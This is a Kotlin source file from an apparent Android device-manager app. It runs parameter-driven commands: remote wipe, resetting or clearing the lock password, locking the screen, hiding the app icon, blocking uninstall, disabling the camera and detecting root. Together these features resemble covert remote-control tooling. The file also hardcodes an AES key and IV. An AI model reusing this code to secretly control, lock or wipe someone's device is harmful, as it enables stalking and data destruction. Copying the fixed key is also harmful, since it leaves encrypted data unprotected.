package com.abuzahra.manager.executor

import android.Manifest
import android.app.Activity
import android.app.KeyguardManager
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import androidx.biometric.BiometricManager
import androidx.biometric.BiometricPrompt
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.fragment.app.FragmentActivity
import com.abuzahra.manager.R
import com.abuzahra.manager.service.DeviceAdminReceiver
import java.io.File
import java.security.MessageDigest
import javax.crypto.Cipher
import javax.crypto.spec.IvParameterSpec
import javax.crypto.spec.SecretKeySpec

/**
 * SecurityExecutor - Complete Implementation
 * All security-related commands with real functionality
 */
object SecurityExecutor {

    private const val TAG = "SecurityExecutor"
    private const val AES_KEY = "AbuZahraSecretKey" // In production, this should be generated dynamically
    private const val AES_IV = "InitializationVec" // 16 bytes

    // ===== DEVICE ADMIN =====

    fun isDeviceAdminActive(context: Context): Boolean {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminComponent = ComponentName(context, DeviceAdminReceiver::class.java)
        return dpm.isAdminActive(adminComponent)
    }

    fun requestDeviceAdmin(context: Context): String {
        return try {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            val adminComponent = ComponentName(context, DeviceAdminReceiver::class.java)
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Enable device admin for security features")
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(intent)
            "Opening Device Admin request"
        } catch (e: Exception) {
            Log.e(TAG, "Request device admin error", e)
            "Error: ${e.message}"
        }
    }

    // ===== WIPE DATA =====
    fun wipeData(context: Context): String {
        return try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(context, DeviceAdminReceiver::class.java)
            
            if (!dpm.isAdminActive(adminComponent)) {
                return "Device Admin not active. Enable it first."
            }
            
            // Wipe all data
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                // Wipe with factory reset protection
                dpm.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE or DevicePolicyManager.WIPE_RESET_PROTECTION_DATA)
            } else {
                dpm.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE)
            }
            "Device wipe initiated..."
        } catch (e: Exception) {
            Log.e(TAG, "Wipe data error", e)
            "Error: ${e.message}"
        }
    }

    // ===== FACTORY RESET =====
    fun factoryReset(context: Context): String {
        return wipeData(context)
    }

    // ===== LOCK SCREEN =====
    fun lockScreenNow(context: Context): String {
        return try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(context, DeviceAdminReceiver::class.java)
            
            if (!dpm.isAdminActive(adminComponent)) {
                return "Device Admin not active. Enable it first."
            }
            
            dpm.lockNow()
            "Screen locked"
        } catch (e: Exception) {
            Log.e(TAG, "Lock screen error", e)
            "Error: ${e.message}"
        }
    }

    // ===== LOCK SCREEN WITH PASSWORD =====
    fun lockWithPassword(context: Context, params: Map<String, Any>): String {
        return try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(context, DeviceAdminReceiver::class.java)
            
            if (!dpm.isAdminActive(adminComponent)) {
                return "Device Admin not active. Enable it first."
            }
            
            val password = params["password"]?.toString() ?: params["arg"]?.toString() ?: ""
            if (password.isEmpty()) {
                return "Password required"
            }
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                // Reset password with new one
                val result = dpm.resetPassword(
                    password,
                    DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY
                )
                
                if (result) {
                    dpm.lockNow()
                    "Password set and screen locked"
                } else {
                    "Failed to set password"
                }
            } else {
                @Suppress("DEPRECATION")
                val result = dpm.resetPassword(password, DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY)
                if (result) {
                    dpm.lockNow()
                    "Password set and screen locked"
                } else {
                    "Failed to set password"
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Lock with password error", e)
            "Error: ${e.message}"
        }
    }

    // ===== SHOW / HIDE APP ICON =====
    fun showApp(context: Context): String {
        return try {
            val pm = context.packageManager
            val componentName = ComponentName(context, "com.abuzahra.manager.MainActivity")
            pm.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            "App icon shown"
        } catch (e: Exception) {
            Log.e(TAG, "Show app error", e)
            "Error: ${e.message}"
        }
    }

    fun hideApp(context: Context): String {
        return try {
            val pm = context.packageManager
            val componentName = ComponentName(context, "com.abuzahra.manager.MainActivity")
            pm.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            "App icon hidden"
        } catch (e: Exception) {
            Log.e(TAG, "Hide app error", e)
            "Error: ${e.message}"
        }
    }

    // ===== CHANGE PASSCODE / SET PIN =====
    fun changePasscode(context: Context, params: Map<String, Any>): String {
        return try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(context, DeviceAdminReceiver::class.java)
            
            if (!dpm.isAdminActive(adminComponent)) {
                return "Device Admin not active. Enable it first."
            }
            
            val password = params["password"]?.toString() ?: params["arg"]?.toString() ?: ""
            if (password.isEmpty()) {
                return "Password required. Usage: password"
            }
            
            // Check password quality requirements
            if (password.length < 4) {
                return "Password must be at least 4 characters"
            }
            
            val result = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                dpm.resetPassword(
                    password,
                    DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY
                )
            } else {
                @Suppress("DEPRECATION")
                dpm.resetPassword(password, DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY)
            }
            
            if (result) {
                "Password changed successfully"
            } else {
                "Failed to change password"
            }
        } catch (e: Exception) {
            Log.e(TAG, "Change passcode error", e)
            "Error: ${e.message}"
        }
    }
    
    fun setPin(context: Context, params: Map<String, Any>): String {
        return changePasscode(context, params)
    }
    
    fun removePin(context: Context): String {
        return try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(context, DeviceAdminReceiver::class.java)
            
            if (!dpm.isAdminActive(adminComponent)) {
                return "Device Admin not active"
            }
            
            // Set empty password to remove
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                dpm.resetPassword("", DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY)
            } else {
                @Suppress("DEPRECATION")
                dpm.resetPassword("", DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY)
            }
            
            "PIN removed"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    // ===== PASSWORD POLICIES =====
    fun setPasswordQuality(context: Context, params: Map<String, Any>): String {
        return try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(context, DeviceAdminReceiver::class.java)
            
            if (!dpm.isAdminActive(adminComponent)) {
                return "Device Admin not active"
            }
            
            val quality = params["quality"]?.toString() ?: "something"
            
            val qualityConstant = when (quality.lowercase()) {
                "unspecified" -> DevicePolicyManager.PASSWORD_QUALITY_UNSPECIFIED
                "something" -> DevicePolicyManager.PASSWORD_QUALITY_SOMETHING
                "numeric" -> DevicePolicyManager.PASSWORD_QUALITY_NUMERIC
                "numeric_complex" -> DevicePolicyManager.PASSWORD_QUALITY_NUMERIC_COMPLEX
                "alphabetic" -> DevicePolicyManager.PASSWORD_QUALITY_ALPHABETIC
                "alphanumeric" -> DevicePolicyManager.PASSWORD_QUALITY_ALPHANUMERIC
                "complex" -> DevicePolicyManager.PASSWORD_QUALITY_COMPLEX
                else -> DevicePolicyManager.PASSWORD_QUALITY_SOMETHING
            }
            
            dpm.setPasswordQuality(adminComponent, qualityConstant)
            "Password quality set to $quality"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }
    
    fun setPasswordMinimumLength(context: Context, params: Map<String, Any>): String {
        return try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(context, DeviceAdminReceiver::class.java)
            
            if (!dpm.isAdminActive(adminComponent)) {
                return "Device Admin not active"
            }
            
            val length = (params["length"] as? Number)?.toInt() 
                ?: params["arg"]?.toString()?.toIntOrNull() 
                ?: 6
            
            dpm.setPasswordMinimumLength(adminComponent, length)
            "Minimum password length set to $length"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }
    
    fun setMaximumFailedPasswords(context: Context, params: Map<String, Any>): String {
        return try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(context, DeviceAdminReceiver::class.java)
            
            if (!dpm.isAdminActive(adminComponent)) {
                return "Device Admin not active"
            }
            
            val attempts = (params["attempts"] as? Number)?.toInt()
                ?: params["arg"]?.toString()?.toIntOrNull()
                ?: 5
            
            dpm.setMaximumFailedPasswordsForWipe(adminComponent, attempts)
            "Device will wipe after $attempts failed password attempts"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    // ===== BIOMETRIC =====
    fun enableBiometric(context: Context): String {
        return try {
            // Check if biometric is available
            val biometricManager = BiometricManager.from(context)
            val canAuthenticate = when (biometricManager.canAuthenticate(BiometricManager.Authenticators.BIOMETRIC_STRONG or BiometricManager.Authenticators.DEVICE_CREDENTIAL)) {
                BiometricManager.BIOMETRIC_SUCCESS -> true
                BiometricManager.BIOMETRIC_ERROR_NO_HARDWARE -> return "No biometric hardware"
                BiometricManager.BIOMETRIC_ERROR_HW_UNAVAILABLE -> return "Biometric hardware unavailable"
                BiometricManager.BIOMETRIC_ERROR_NONE_ENROLLED -> {
                    // Open settings to enroll
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                        context.startActivity(Intent(Settings.ACTION_BIOMETRIC_ENROLL).apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        })
                    } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        context.startActivity(Intent(Settings.ACTION_FINGERPRINT_ENROLL).apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        })
                    } else {
                        context.startActivity(Intent(Settings.ACTION_SECURITY_SETTINGS).apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        })
                    }
                    return "No biometric enrolled. Opening settings"
                }
                BiometricManager.BIOMETRIC_ERROR_SECURITY_UPDATE_REQUIRED -> return "Security update required"
                BiometricManager.BIOMETRIC_ERROR_UNSUPPORTED -> return "Biometric unsupported"
                BiometricManager.BIOMETRIC_STATUS_UNKNOWN -> return "Biometric status unknown"
                else -> false
            }
            
            if (canAuthenticate) {
                "Biometric is available and configured"
            } else {
                "Biometric not available"
            }
        } catch (e: Exception) {
            Log.e(TAG, "Enable biometric error", e)
            "Error: ${e.message}"
        }
    }

    fun disableBiometric(context: Context): Map<String, Any> {
        return try {
            val intent = when {
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.R -> {
                    Intent(Settings.ACTION_BIOMETRIC_ENROLL).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        putExtra("biometric_enroll", true)
                    }
                }
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.P -> {
                    Intent(Settings.ACTION_FINGERPRINT_ENROLL).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                }
                else -> {
                    Intent(Settings.ACTION_SECURITY_SETTINGS).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                }
            }
            context.startActivity(intent)
            mapOf(
                "status" to "opened_settings",
                "message" to "Opening security/biometric settings. Biometric cannot be disabled programmatically for security reasons - user must manually remove biometric data.",
                "action_required" to "user_manual_removal"
            )
        } catch (e: Exception) {
            mapOf("error" to (e.message ?: "Failed to open settings"))
        }
    }
    
    fun getBiometricStatus(context: Context): Map<String, Any> {
        return try {
            val biometricManager = BiometricManager.from(context)
            val status = biometricManager.canAuthenticate(BiometricManager.Authenticators.BIOMETRIC_STRONG or BiometricManager.Authenticators.DEVICE_CREDENTIAL)
            
            val statusMessage = when (status) {
                BiometricManager.BIOMETRIC_SUCCESS -> "Biometric ready"
                BiometricManager.BIOMETRIC_ERROR_NO_HARDWARE -> "No biometric hardware"
                BiometricManager.BIOMETRIC_ERROR_HW_UNAVAILABLE -> "Hardware unavailable"
                BiometricManager.BIOMETRIC_ERROR_NONE_ENROLLED -> "No biometric enrolled"
                BiometricManager.BIOMETRIC_ERROR_SECURITY_UPDATE_REQUIRED -> "Security update required"
                BiometricManager.BIOMETRIC_ERROR_UNSUPPORTED -> "Unsupported"
                BiometricManager.BIOMETRIC_STATUS_UNKNOWN -> "Status unknown"
                else -> "Unknown status"
            }
            
            mapOf(
                "status_code" to status,
                "status" to statusMessage,
                "can_authenticate" to (status == BiometricManager.BIOMETRIC_SUCCESS)
            )
        } catch (e: Exception) {
            mapOf("error" to (e.message ?: "Unknown error"))
        }
    }

    // ===== ANTI UNINSTALL =====
    fun antiUninstallOn(context: Context): String {
        return try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(context, DeviceAdminReceiver::class.java)
            
            if (!dpm.isAdminActive(adminComponent)) {
                // Request device admin
                return "Device Admin must be activated for anti-uninstall protection. Use request_device_admin first."
            }
            
            // Device admin already provides anti-uninstall protection
            "Anti-uninstall protection active (Device Admin enabled)"
        } catch (e: Exception) {
            Log.e(TAG, "Anti-uninstall on error", e)
            "Error: ${e.message}"
        }
    }

    fun antiUninstallOff(context: Context): String {
        return try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(context, DeviceAdminReceiver::class.java)
            
            if (dpm.isAdminActive(adminComponent)) {
                dpm.removeActiveAdmin(adminComponent)
                "Anti-uninstall protection disabled (Device Admin removed)"
            } else {
                "Device Admin was not active"
            }
        } catch (e: Exception) {
            Log.e(TAG, "Anti-uninstall off error", e)
            "Error: ${e.message}"
        }
    }

    // ===== DEVICE ADMIN STATUS =====
    fun deviceAdminStatus(context: Context): Map<String, Any> {
        return try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(context, DeviceAdminReceiver::class.java)
            val isAdmin = dpm.isAdminActive(adminComponent)
            
            val policies = mutableListOf<String>()
            if (isAdmin) {
                if (dpm.getPasswordQuality(adminComponent) != DevicePolicyManager.PASSWORD_QUALITY_UNSPECIFIED) {
                    policies.add("password_quality")
                }
                if (dpm.getPasswordMinimumLength(adminComponent) > 0) {
                    policies.add("password_minimum_length")
                }
                if (dpm.getMaximumFailedPasswordsForWipe(adminComponent) > 0) {
                    policies.add("maximum_failed_passwords")
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    if (dpm.isDeviceOwnerApp(context.packageName)) {
                        policies.add("device_owner")
                    }
                    if (dpm.isProfileOwnerApp(context.packageName)) {
                        policies.add("profile_owner")
                    }
                }
            }
            
            mapOf(
                "is_device_admin" to isAdmin,
                "active_admins" to (dpm.activeAdmins?.size ?: 0),
                "is_device_owner" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) dpm.isDeviceOwnerApp(context.packageName) else false,
                "is_profile_owner" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) dpm.isProfileOwnerApp(context.packageName) else false,
                "policies" to policies,
                "device_owner_name" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    try { dpm.getDeviceOwnerName() ?: "" } catch (e: Exception) { "" }
                } else ""
            )
        } catch (e: Exception) {
            Log.e(TAG, "Device admin status error", e)
            mapOf("error" to (e.message ?: ""))
        }
    }

    // ===== CHECK ROOT =====
    fun checkRoot(): Map<String, Any> {
        val rootPaths = arrayOf(
            "/system/bin/su",
            "/system/xbin/su",
            "/sbin/su",
            "/system/bin/failsafe/su",
            "/data/local/xbin/su",
            "/data/local/bin/su",
            "/system/sd/xbin/su",
            "/system/bin/curl",
            "/system/bin/wget",
            "/data/local/su",
            "/su/bin/su",
            "/magisk/.core/bin/su",
            "/apex/com.android.runtime/bin/su"
        )
        
        var hasRoot = false
        val foundPaths = mutableListOf<String>()
        
        for (path in rootPaths) {
            val file = File(path)
            if (file.exists()) {
                hasRoot = true
                foundPaths.add(path)
            }
        }
        
        // Also check for root management apps
        val rootApps = arrayOf(
            "com.koushikdutta.superuser",
            "com.thirdparty.superuser",
            "eu.chainfire.supersu",
            "com.noshufou.android.su",
            "com.topjohnwu.magisk"
        )
        
        return mapOf(
            "rooted" to hasRoot,
            "found_paths" to foundPaths,
            "message" to if (hasRoot) "Device is rooted" else "Device is not rooted"
        )
    }
    
    fun checkMagisk(): Map<String, Any> {
        val magiskPaths = arrayOf(
            "/sbin/.magisk",
            "/cache/.magisk",
            "/data/adb/magisk",
            "/data/adb/ksu",
            "/data/adb/ap"
        )
        
        var hasMagisk = false
        val foundPaths = mutableListOf<String>()
        
        for (path in magiskPaths) {
            if (File(path).exists()) {
                hasMagisk = true
                foundPaths.add(path)
            }
        }
        
        return mapOf(
            "has_magisk" to hasMagisk,
            "found_paths" to foundPaths
        )
    }

    // ===== SCREEN LOCK =====
    fun setScreenLock(context: Context): String {
        return try {
            val km = context.getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
            if (km.isDeviceSecure) {
                return "Screen lock is already configured (device is secure)"
            }
            // Open lock screen settings to let user set up a lock
            val intent = Intent(Settings.ACTION_SECURITY_SETTINGS).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
            "Opening security settings to set screen lock"
        } catch (e: Exception) {
            Log.e(TAG, "Set screen lock error", e)
            "Error: ${e.message}"
        }
    }

    fun removeScreenLock(context: Context): String {
        return try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(context, DeviceAdminReceiver::class.java)

            if (!dpm.isAdminActive(adminComponent)) {
                // Try opening settings directly for lock screen removal
                val intent = Intent(Settings.ACTION_SECURITY_SETTINGS).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
                return "Opening security settings - Device Admin not active. Remove lock manually or activate Device Admin first."
            }

            // Reset password to empty to remove screen lock
            val result = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                dpm.resetPassword("", DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY)
            } else {
                @Suppress("DEPRECATION")
                dpm.resetPassword("", DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY)
            }

            if (result) {
                dpm.lockNow()
                "Screen lock removed (password reset to empty via Device Admin)"
            } else {
                "Failed to remove screen lock - device may have additional restrictions"
            }
        } catch (e: Exception) {
            Log.e(TAG, "Remove screen lock error", e)
            "Error: ${e.message}"
        }
    }
    
    fun isScreenLockEnabled(context: Context): Map<String, Any> {
        return try {
            val km = context.getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
            val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
            
            mapOf(
                "is_secure" to km.isDeviceSecure,
                "is_locked" to km.isKeyguardLocked,
                "is_keyguard_showing" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) km.isDeviceLocked else false,
                "screen_on" to pm.isInteractive
            )
        } catch (e: Exception) {
            mapOf("error" to (e.message ?: ""))
        }
    }

    // ===== CAMERA DISABLE =====
    fun disableCamera(context: Context): String {
        return try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(context, DeviceAdminReceiver::class.java)
            
            if (!dpm.isAdminActive(adminComponent)) {
                return "Device Admin not active"
            }
            
            dpm.setCameraDisabled(adminComponent, true)
            "Camera disabled"
        } catch (e: Exception) {
            Log.e(TAG, "Disable camera error", e)
            "Error: ${e.message}"
        }
    }
    
    fun enableCamera(context: Context): String {
        return try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(context, DeviceAdminReceiver::class.java)
            
            if (!dpm.isAdminActive(adminComponent)) {
                return "Device Admin not active"
            }
            
            dpm.setCameraDisabled(adminComponent, false)
            "Camera enabled"
        } catch (e: Exception) {
            Log.e(TAG, "Enable camera error", e)
            "Error: ${e.message}"
        }
    }
    
    fun isCameraDisabled(context: Context): Boolean {
        return try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            dpm.getCameraDisabled(null)
        } catch (_: Exception) {
            false
        }
    }

    // ===== SCREEN CAPTURE =====
    @Suppress("DEPRECATION")
    fun disableScreenCapture(context: Context): String {
        return try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(context, DeviceAdminReceiver::class.java)
            
            if (!dpm.isAdminActive(adminComponent)) {
                return "Device Admin not active"
            }
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                dpm.setScreenCaptureDisabled(adminComponent, true)
            } else {
                // For older versions, use FLAG_SECURE in windows
            }
            
            "Screen capture disabled"
        } catch (e: Exception) {
            Log.e(TAG, "Disable screen capture error", e)
            "Error: ${e.message}"
        }
    }
    
    fun enableScreenCapture(context: Context): String {
        return try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(context, DeviceAdminReceiver::class.java)
            
            if (!dpm.isAdminActive(adminComponent)) {
                return "Device Admin not active"
            }
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                dpm.setScreenCaptureDisabled(adminComponent, false)
            }
            
            "Screen capture enabled"
        } catch (e: Exception) {
            Log.e(TAG, "Enable screen capture error", e)
            "Error: ${e.message}"
        }
    }

    // ===== ENCRYPTION =====
    fun encryptData(data: String): String? {
        return try {
            val keySpec = SecretKeySpec(AES_KEY.toByteArray(), "AES")
            val ivSpec = IvParameterSpec(AES_IV.toByteArray())
            
            val cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
            cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec)
            
            val encrypted = cipher.doFinal(data.toByteArray())
            android.util.Base64.encodeToString(encrypted, android.util.Base64.DEFAULT)
        } catch (e: Exception) {
            Log.e(TAG, "Encrypt error", e)
            null
        }
    }
    
    fun decryptData(encryptedData: String): String? {
        return try {
            val keySpec = SecretKeySpec(AES_KEY.toByteArray(), "AES")
            val ivSpec = IvParameterSpec(AES_IV.toByteArray())
            
            val cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
            cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec)
            
            val decoded = android.util.Base64.decode(encryptedData, android.util.Base64.DEFAULT)
            val decrypted = cipher.doFinal(decoded)
            String(decrypted)
        } catch (e: Exception) {
            Log.e(TAG, "Decrypt error", e)
            null
        }
    }
    
    fun sha256(input: String): String {
        val md = MessageDigest.getInstance("SHA-256")
        val digest = md.digest(input.toByteArray())
        return digest.joinToString("") { "%02x".format(it) }
    }

    // ===== KEYGUARD =====
    fun dismissKeyguard(context: Context): String {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val km = context.getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
                val activity = context as? Activity ?: return "error_not_activity"
                km.requestDismissKeyguard(
                    activity,
                    object : KeyguardManager.KeyguardDismissCallback() {
                        override fun onDismissSucceeded() {
                            // Keyguard dismissed
                        }
                        override fun onDismissCancelled() {
                            // Dismiss cancelled
                        }
                        override fun onDismissError() {
                            // Dismiss error
                        }
                    }
                )
                "Requesting keyguard dismiss"
            } else {
                "Keyguard dismiss requires Android 8+"
            }
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }
    
    // ===== ENCRYPTION STATUS =====
    fun getEncryptionStatus(context: Context): Map<String, Any> {
        return try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            
            mapOf(
                "storage_encryption_status" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    when (dpm.storageEncryptionStatus) {
                        DevicePolicyManager.ENCRYPTION_STATUS_INACTIVE -> "inactive"
                        DevicePolicyManager.ENCRYPTION_STATUS_ACTIVE -> "active"
                        DevicePolicyManager.ENCRYPTION_STATUS_UNSUPPORTED -> "unsupported"
                        DevicePolicyManager.ENCRYPTION_STATUS_ACTIVATING -> "activating"
                        DevicePolicyManager.ENCRYPTION_STATUS_ACTIVE_DEFAULT_KEY -> "active_default_key"
                        DevicePolicyManager.ENCRYPTION_STATUS_ACTIVE_PER_USER -> "active_per_user"
                        else -> "unknown"
                    }
                } else "unknown",
                "is_encrypted" to (dpm.storageEncryptionStatus == DevicePolicyManager.ENCRYPTION_STATUS_ACTIVE)
            )
        } catch (e: Exception) {
            mapOf("error" to (e.message ?: ""))
        }
    }
}
